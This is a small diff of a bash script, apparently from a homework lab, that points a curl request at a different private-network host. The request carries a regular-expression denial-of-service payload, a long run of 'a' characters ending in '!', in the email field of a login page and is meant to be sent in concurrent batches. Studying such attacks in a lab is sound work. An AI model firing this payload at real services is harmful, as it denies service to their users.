@@ -1,7 +1,7 @@
 #!/bin/bash
 
 task(){
-    curl -s "http://192.168.0.120/Homework3/final/index.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
+    curl -s "http://192.168.154.132/redos/index.php?email=aaaaaaaaaaaaaaa!&password=test" > /dev/null
 }
 
 # N-process batches, every batch has N concurrent processes
